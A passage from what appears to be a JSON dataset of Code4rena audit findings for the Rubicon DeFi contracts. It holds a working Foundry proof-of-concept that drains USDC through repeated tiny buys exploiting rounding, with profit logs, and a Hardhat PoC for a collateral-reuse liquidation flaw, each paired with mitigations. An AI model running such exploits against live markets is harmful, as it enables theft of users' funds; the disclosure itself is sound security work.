USDC.approve(address(market), type(uint256).max);\n    // place ask and bid for WBTC/USDC pair at price 30,000 USDC/WBTC\n    WBTCOfferId = market.offer(300000e6, USDC, 10e8, WBTC, address(this), owner);\n\n    // place ask and bid for GUSD/USC pair at price 1 USDC/GUSD\n    GUSDOfferId = market.offer(300000e6, USDC, 300000e2, GUSD, address(this), owner);\n\n\n    WBTC.mint(attacker, 10);\n    vm.prank(attacker);\n    WBTC.approve(address(market), type(uint256).max);\n\n    GUSD.mint(attacker, 100000);\n    vm.prank(attacker);\n    GUSD.approve(address(market), type(uint256).max);\n  }\n\n  function test_AttackOnWBTCPair() public {\n    uint256 l2GasCost;\n    uint256 USDCReceived;\n    uint256 WBTCSent;\n    { // stack too deep\n      uint256 USDCBalanceBefore = USDC.balanceOf(attacker);\n      uint256 WBTCBalanceBefore = WBTC.balanceOf(attacker);\n\n      vm.startPrank(attacker);\n      uint256 gasBefore = gasleft();\n      for (uint256 i; i < 300; ++i) { // sum of gas can't excess block gas limit of 15M\n          market.buy(WBTCOfferId, 599);\n      }\n      uint256 gasAfter = gasleft();\n      vm.stopPrank();\n      l2GasCost = gasBefore - gasAfter;\n      uint256 USDCBalanceAfter = USDC.balanceOf(attacker);\n      USDCReceived = USDCBalanceAfter - USDCBalanceBefore;\n      uint256 WBTCBalanceAfter = WBTC.balanceOf(attacker);\n      WBTCSent = WBTCBalanceBefore - WBTCBalanceAfter;\n    }\n\n    // reference https://dune.com/queries/508560/961244\n    uint256 l1GasCost = 4013;\n    uint256 l1GasPrice = 4e9;\n    uint256 l2GasPrice = 0.001e9;\n    uint256 ETHPrice = 2000e6;\n    uint256 l1GasCostInUSDC = l1GasCost * l1GasPrice * ETHPrice / 1e18;\n    uint256 l2GasCostInUSDC = l2GasCost * l2GasPrice * ETHPrice / 1e18;\n    uint256 WBTCCostInUSDC = WBTCSent * 30000e6 / 1e8;\n    uint256 totalCostInUSDC = l1GasCostInUSDC + l2GasCostInUSDC + WBTCCostInUSDC;\n    uint256 profitInUSDC = USDCReceived - totalCostInUSDC;\n    uint256 profitInPercentage = 100 * profitInUSDC / totalCostInUSDC;\n\n    console.log(\"==========Attack on WBTC pair==========\");\n    console.log(\"Given price: 2000 USDC/ETH, 30,000 USDC/BTC\");\n    console.log(\"Given L1(Ethereum) gas price: 4 Gwei\");\n    console.log(\"Given L2(Optimism) gas price: 0.001 Gwei\");\n    console.log(\"Given decimals: WBTC(8), USDC(6)\");\n    console.log(\"L1 gas cost:\", l1GasCost);\n    console.log(\"L1 gas cost in USDC:\", l1GasCostInUSDC);\n    console.log(\"L2 gas cost:\", l2GasCost);\n    console.log(\"L2 gas cost in USDC:\", l2GasCostInUSDC);\n    console.log(\"WBTC cost:\", WBTCSent);\n    console.log(\"WBTC cost in USDC:\", WBTCCostInUSDC);\n    console.log(\"Total cost in USDC:\", totalCostInUSDC);\n    console.log(\"USDC received:\", USDCReceived);\n    console.log(\"Profit in USDC:\", profitInUSDC);\n    console.log(\"Profit in percentage:\", profitInPercentage, \"%\");\n  }\n\n  function test_AttackOnGUSDPair() public {\n    uint256 l2GasCost;\n    uint256 USDCReceived;\n    uint256 GUSDSent;\n    { // stack too deep\n      uint256 USDCBalanceBefore = USDC.balanceOf(attacker);\n      uint256 GUSDBalanceBefore = GUSD.balanceOf(attacker);\n\n      vm.startPrank(attacker);\n      uint256 gasBefore = gasleft();\n      for (uint256 i; i < 300; ++i) { // sum of gas can't excess block gas limit of 15M\n          market.buy(GUSDOfferId, 19_999);\n      }\n      uint256 gasAfter = gasleft();\n      vm.stopPrank();\n      l2GasCost = gasBefore - gasAfter;\n      uint256 USDCBalanceAfter = USDC.balanceOf(attacker);\n      USDCReceived = USDCBalanceAfter - USDCBalanceBefore;\n      uint256 GUSDBalanceAfter = GUSD.balanceOf(attacker);\n      GUSDSent = GUSDBalanceBefore - GUSDBalanceAfter;\n    }\n\n    // reference https://dune.com/queries/508560/961244\n    uint256 l1GasCost = 4013;\n    uint256 l1GasPrice = 20e9;\n    uint256 l2GasPrice = 0.001e9;\n    uint256 ETHPrice = 2000e6;\n    uint256 l1GasCostInUSDC = l1GasCost * l1GasPrice * ETHPrice / 1e18;\n    uint256 l2GasCostInUSDC = l2GasCost * l2GasPrice * ETHPrice / 1e18;\n    uint256 GUSDCostInUSDC = GUSDSent * 1e6 / 1e2;\n    uint256 totalCostInUSDC = l1GasCostInUSDC + l2GasCostInUSDC + GUSDCostInUSDC;\n    uint256 profitInUSDC = USDCReceived - totalCostInUSDC;\n    uint256 profitInPercentage = 100 * profitInUSDC / totalCostInUSDC;\n\n    console.log(\"==========Attack on GUSD pair==========\");\n    console.log(\"Given price: 2000 USDC/ETH, 30,000 USDC/BTC\");\n    console.log(\"Given L1(Ethereum) gas price: 20 Gwei\");\n    console.log(\"Given L2(Optimism) gas price: 0.001 Gwei\");\n    console.log(\"Given decimals: GUSD(2), USDC(6)\");\n    console.log(\"L1 gas cost:\", l1GasCost);\n    console.log(\"L1 gas cost in USDC:\", l1GasCostInUSDC);\n    console.log(\"L2 gas cost:\", l2GasCost);\n    console.log(\"L2 gas cost in USDC:\", l2GasCostInUSDC);\n    console.log(\"GUSD cost:\", GUSDSent);\n    console.log(\"GUSD cost in USDC:\", GUSDCostInUSDC);\n    console.log(\"Total cost in USDC:\", totalCostInUSDC);\n    console.log(\"USDC received:\", USDCReceived);\n    console.log(\"Profit in USDC:\", profitInUSDC);\n    console.log(\"Profit in percentage:\", profitInPercentage, \"%\");\n  }\n\n}\n\n```\n\n#### Case 1:  ````WBTC/USDC```` pair\nThe given market parameters and test result for case 1:\n```solidity\n[PASS] test_AttackOnWBTCPair() (gas: 11427870)\nLogs:\n  ==========Attack on WBTC pair==========\n  Given price: 2000 USDC/ETH, 30,000 USDC/BTC\n  Given L1(Ethereum) gas price: 4 Gwei\n  Given L2(Optimism) gas price: 0.001 Gwei\n  Given decimals: WBTC(8), USDC(6)\n  L1 gas cost: 4013\n  L1 gas cost in USDC: 32104\n  L2 gas cost: 14251627\n  L2 gas cost in USDC: 28503\n  WBTC cost: 300\n  WBTC cost in USDC: 90000\n  Total cost in USDC: 150607\n  USDC received: 179700\n  Profit in USDC: 29093\n  Profit in percentage: 19 %\n```\nFrom the log, we can see a 19% profit in one attack. The absolute profit value is about 0.029 USDC, though it is small, but Optimism confirms transactions instantly, attackers can submit huge number of transactions such as 1M to get 29,000 USDC profit.\n\nOne point needs to be pointed out, market parameters other than L1 gas price are consistent with the actual normal situations. The 4 Gwei L1 gas price is a a relatively low price, and it's a key condition to make the attack be profitable. But this scenario can actually happen, here is some instances when gas price drops below 4 Gwei.\nsource: https://public-grafana.optimism.io/d/9hkhMxn7z/public-dashboard?orgId=1&refresh=5m&viewPanel=6&from=now-1y&to=now&inspect=6&inspectTab=data\n```solidity\n2022/8/21 18:00 | 1.56939\n2022/9/19 18:00 | 2.3536\n2022/9/17 12:00 | 2.63193\n2022/7/31 12:00 | 2.87714\n2022/8/21 12:00 | 2.99122\n2022/7/31 6:00 | 3.03533\n2022/10/5 18:00 | 3.14388\n2022/9/4 18:00 | 3.15065\n2022/10/2 18:00 | 3.18227\n2022/9/4 6:00 | 3.19788\n2022/7/31 18:00 | 3.20089\n2022/8/1 12:00 | 3.22637\n2022/9/4 12:00 | 3.34139\n2022/8/20 18:00 | 3.57428\n2022/9/18 12:00 | 3.57598\n2022/9/22 18:00 | 3.60006\n2022/8/14 18:00 | 3.63901\n2022/9/18 6:00 | 3.72209\n2022/9/12 12:00 | 3.74844\n2022/8/29 0:00 | 3.8843\n2022/8/21 6:00 | 3.94099\n2022/9/25 12:00 | 3.97128\n2022/9/21 18:00 | 3.98098\n2022/8/6 18:00 | 3.98923\n```\n\n#### Case 2:  ````GUSD/USDC```` pair\nThe given market parameters and test result for case 2:\n```solidity\n[PASS] test_AttackOnGUSDPair() (gas: 11427889)\nLogs:\n  ==========Attack on GUSD pair==========\n  Given price: 2000 USDC/ETH, 30,000 USDC/BTC\n  Given L1(Ethereum) gas price: 20 Gwei\n  Given L2(Optimism) gas price: 0.001 Gwei\n  Given decimals: GUSD(2), USDC(6)\n  L1 gas cost: 4013\n  L1 gas cost in USDC: 160520\n  L2 gas cost: 14251627\n  L2 gas cost in USDC: 28503\n  GUSD cost: 300\n  GUSD cost in USDC: 3000000\n  Total cost in USDC: 3189023\n  USDC received: 5999400\n  Profit in USDC: 2810377\n  Profit in percentage: 88 %\n```\nFor the ````GUSD```` pair, we can see, even on a normal 20 Gwei L1 gas price condition, the attack profit rate is 88%. The absolute profit value in one attack is about 2.8 USDC. Similarly,  attackers can submit huge number of transactions to make a significant profit.\n\n## Tools Used\nManually review\n\n## Recommended Mitigation Steps\nCalculation of ````spend```` should be rounded up.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 545,
      "page_start": null,
      "heading": "545. When opening a position, the collateral of the previous position is used for borrowing, which makes the user more easily liquidated",
      "heading_cleaned": "When opening a position, the collateral of the previous position is used for borrowing, which makes the user more easily liquidated",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L537-L550\n\n\n# Vulnerability details\n\n## Impact\nWhen a user opens a position, if there are collateral in previous positions that have not reached the maximum borrowable amount, these collateral will be used for borrowing, which may cause the user to reach the liquidation threshold, resulting in the user being liquidated.\n```solidity\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n```\nI will use an example to illustrate it.\nConsider the WBTC collateralization rate is 0.7.\n\nalice is long WBTC using 1e8 WBTC and 1.6x leverage, the contract will collateralize 1e8 WBTC and borrow 0.6e8 WBTC, at which point alice is 0.7 - 0.6/1 = 10% away from the liquidation threshold.\n\nIf alice continues to use 1e8 WBTC and 1.8x leverage to long WBTC, the previous position will be able to borrow 0.1e8 WBTC, plus the 0.7e8 WBTC that was borrowed by collateralizing 1e8 WBTC, which can be covered without further collateralizing and borrowing, resulting in alice currently being 0.7 - (0.7 + 0.7)/(1+1) = 0 away from the liquidation threshold. i.e. if the price of WBTC drops slightly, alice will be liquidated\n\nAnd if under normal circumstances alice is long WBTC using 1e8 WBTC and 1.8x leverage, the contract will collateralize 1e8 WBTC and borrow 0.7e8 WBTC, then collateralize 0.7e8 WBTC and borrow 0.1 WBTC, at which point alice is 0.7 - 0.8/1.7 = 23% from the liquidation threshold.\n\nThe following POC indicates that when a user opens a position with 1.6x and 1.8x leverage in succession, the user will reach the liquidation threshold.\n\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"LPOC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket, comptroller } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_6 = parseUnits(\"1.6\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_6\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n        const x1_8 = parseUnits(\"1.8\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_8\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n      });\n      it(\"LPOC2\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket, comptroller } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_8 = parseUnits(\"1.8\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_8\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Long positions ðŸ“ˆ\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"90000000000000000\" },\n  BigNumber { value: \"0\" }\n]\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"0\" }\n]\n        âœ“ LPOC1\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"347451975478099020\" },\n  BigNumber { value: \"0\" }\n]\n```\n## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L537-L550\n## Tools Used\nhardhat\n## Recommended Mitigation Steps\nConsider not using collateral from previous positions for borrowing when opening a position\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L537-L550\n\n\n# Vulnerability details\n\n## Impact\nWhen a user opens a position, if there are collateral in previous positions that have not reached the maximum borrowable amount, these collateral will be used for borrowing, which may cause the user to reach the liquidation threshold, resulting in the user being liquidated.\n```solidity\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n```\nI will use an example to illustrate it.\nConsider the WBTC collateralization rate is 0.7.\n\nalice is long WBTC using 1e8 WBTC and 1.6x leverage, the contract will collateralize 1e8 WBTC and borrow 0.6e8 WBTC, at which point alice is 0.7 - 0.6/1 = 10% away from the liquidation threshold.\n\nIf alice continues to use 1e8 WBTC and 1.8x leverage to long WBTC, the previous position will be able to borrow 0.1e8 WBTC, plus the 0.7e8 WBTC that was borrowed by collateralizing 1e8 WBTC, which can be covered without further collateralizing and borrowing, resulting in alice currently being 0.7 - (0.7 + 0.7)/(1+1) = 0 away from the liquidation threshold. i.e. if the price of WBTC drops slightly, alice will be liquidated\n\nAnd if under normal circumstances alice is long WBTC using 1e8 WBTC and 1.8x leverage, the contract will collateralize 1e8 WBTC and borrow 0.7e8 WBTC, then collateralize 0.7e8 WBTC and borrow 0.1 WBTC, at which point alice is 0.7 - 0.8/1.7 = 23% from the liquidation threshold.\n\nThe following POC indicates that when a user opens a position with 1.6x and 1.8x leverage in succession, the user will reach the liquidation threshold.\n\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"LPOC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket, comptroller } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_6 = parseUnits(\"1.6\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_6\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n        const x1_8 = parseUnits(\"1.8\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_8\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n      });\n      it(\"LPOC2\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket, comptroller } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_8 = parseUnits(\"1.8\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_8\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Long positions ðŸ“ˆ\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"90000000000000000\" },\n  BigNumber { value: \"0\" }\n]\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"0\" }\n]\n        âœ“ LPOC1\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"347451975478099020\" },\n  BigNumber { value: \"0\" }\n]\n```\n## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L537-L550\n## Tools Used\nhardhat\n## Recommended Mitigation Steps\nConsider not using collateral from previous positions for borrowing when opening a position",
      "description": null,
      "impact": "## Impact\nWhen a user opens a position, if there are collateral in previous positions that have not reached the maximum borrowable amount, these collateral will be used for borrowing, which may cause the user to reach the liquidation threshold, resulting in the user being liquidated.\n```solidity\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n```\nI will use an example to illustrate it.\nConsider the WBTC collateralization rate is 0.7.\n\nalice is long WBTC using 1e8 WBTC and 1.6x leverage, the contract will collateralize 1e8 WBTC and borrow 0.6e8 WBTC, at which point alice is 0.7 - 0.6/1 = 10% away from the liquidation threshold.\n\nIf alice continues to use 1e8 WBTC and 1.8x leverage to long WBTC, the previous position will be able to borrow 0.1e8 WBTC, plus the 0.7e8 WBTC that was borrowed by collateralizing 1e8 WBTC, which can be covered without further collateralizing and borrowing, resulting in alice currently being 0.7 - (0.7 + 0.7)/(1+1) = 0 away from the liquidation threshold. i.e. if the price of WBTC drops slightly, alice will be liquidated\n\nAnd if under normal circumstances alice is long WBTC using 1e8 WBTC and 1.8x leverage, the contract will collateralize 1e8 WBTC and borrow 0.7e8 WBTC, then collateralize 0.7e8 WBTC and borrow 0.1 WBTC, at which point alice is 0.7 - 0.8/1.7 = 23% from the liquidation threshold.\n\nThe following POC indicates that when a user opens a position with 1.6x and 1.8x leverage in succession, the user will reach the liquidation threshold.\n\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"LPOC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket, comptroller } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_6 = parseUnits(\"1.6\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_6\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n        const x1_8 = parseUnits(\"1.8\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_8\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n      });\n      it(\"LPOC2\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket, comptroller } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_8 = parseUnits(\"1.8\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_8\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Long positions ðŸ“ˆ\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"90000000000000000\" },\n  BigNumber { value: \"0\" }\n]\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"0\" }\n]\n        âœ“ LPOC1\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"347451975478099020\" },\n  BigNumber { value: \"0\" }\n]\n```\n",
      "mitigation": "## Recommended Mitigation Steps\nConsider not using collateral from previous positions for borrowing when opening a position\n",
      "poc": "## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L537-L550\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L537-L550\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nhardhat\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nWhen a user opens a position, if there are collateral in previous positions that have not reached the maximum borrowable amount, these collateral will be used for borrowing, which may cause the user to reach the liquidation threshold, resulting in the user being liquidated.\n```solidity\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n```\nI will use an example to illustrate it.\nConsider the WBTC collateralization rate is 0.7.\n\nalice is long WBTC using 1e8 WBTC and 1.6x leverage, the contract will collateralize 1e8 WBTC and borrow 0.6e8 WBTC, at which point alice is 0.7 - 0.6/1 = 10% away from the liquidation threshold.\n\nIf alice continues to use 1e8 WBTC and 1.8x leverage to long WBTC, the previous position will be able to borrow 0.1e8 WBTC, plus the 0.7e8 WBTC that was borrowed by collateralizing 1e8 WBTC, which can be covered without further collateralizing and borrowing, resulting in alice currently being 0.7 - (0.7 + 0.7)/(1+1) = 0 away from the liquidation threshold. i.e. if the price of WBTC drops slightly, alice will be liquidated\n\nAnd if under normal circumstances alice is long WBTC using 1e8 WBTC and 1.8x leverage, the contract will collateralize 1e8 WBTC and borrow 0.7e8 WBTC, then collateralize 0.7e8 WBTC and borrow 0.1 WBTC, at which point alice is 0.7 - 0.8/1.7 = 23% from the liquidation threshold.\n\nThe following POC indicates that when a user opens a position with 1.6x and 1.8x leverage in succession, the user will reach the liquidation threshold.\n\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"LPOC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket, comptroller } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_6 = parseUnits(\"1.6\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_6\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n        const x1_8 = parseUnits(\"1.8\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_8\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n      });\n      it(\"LPOC2\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket, comptroller } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_8 = parseUnits(\"1.8\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_8\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Long positions ðŸ“ˆ\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"90000000000000000\" },\n  BigNumber { value: \"0\" }\n]\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"0\" }\n]\n        âœ“ LPOC1\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"347451975478099020\" },\n  BigNumber { value: \"0\" }\n]\n```\n",
        "recommendation": "## Recommended Mitigation Steps\nConsider not using collateral from previous positions for borrowing when opening a position\n",
        "poc": "## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L537-L550\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L537-L550\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nhardhat\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L537-L550\n\n\n# Vulnerability details\n\n## Impact\nWhen a user opens a position, if there are collateral in previous positions that have not reached the maximum borrowable amount, these collateral will be used for borrowing, which may cause the user to reach the liquidation threshold, resulting in the user being liquidated.\n```solidity\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n```\nI will use an example to illustrate it.\nConsider the WBTC collateralization rate is 0.7.\n\nalice is long WBTC using 1e8 WBTC and 1.6x leverage, the contract will collateralize 1e8 WBTC and borrow 0.6e8 WBTC, at which point alice is 0.7 - 0.6/1 = 10% away from the liquidation threshold.\n\nIf alice continues to use 1e8 WBTC and 1.8x leverage to long WBTC, the previous position will be able to borrow 0.1e8 WBTC, plus the 0.7e8 WBTC that was borrowed by collateralizing 1e8 WBTC, which can be covered without further collateralizing and borrowing, resulting in alice currently being 0.7 - (0.7 + 0.7)/(1+1) = 0 away from the liquidation threshold. i.e. if the price of WBTC drops slightly, alice will be liquidated\n\nAnd if under normal circumstances alice is long WBTC using 1e8 WBTC and 1.8x leverage, the contract will collateralize 1e8 WBTC and borrow 0.7e8 WBTC, then collateralize 0.7e8 WBTC and borrow 0.1 WBTC, at which point alice is 0.7 - 0.8/1.7 = 23% from the liquidation threshold.\n\nThe following POC indicates that when a user opens a position with 1.6x and 1.8x leverage in succession, the user will reach the liquidation threshold.\n\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"LPOC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket, comptroller } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_6 = parseUnits(\"1.6\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_6\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n        const x1_8 = parseUnits(\"1.8\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_8\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n      });\n      it(\"LPOC2\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket, comptroller } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_8 = parseUnits(\"1.8\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_8\n        );\n        console.log(\"owner liquidity %s\",await comptroller.getAccountLiquidity(Position.address));\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Long positions ðŸ“ˆ\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"90000000000000000\" },\n  BigNumber { value: \"0\" }\n]\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"0\" }\n]\n        âœ“ LPOC1\nowner liquidity [\n  BigNumber { value: \"0\" },\n  BigNumber { value: \"347451975478099020\" },\n  BigNumber { value: \"0\" }\n]\n```\n## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L537-L550\n## Tools Used\nhardhat\n## Recommended Mitigation Steps\nConsider not using collateral from previous positions for borrowing when opening a position\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 557,
      "page_start": null,
      "heading": "557. Potential infinite loop in `_borrowLimit` function",
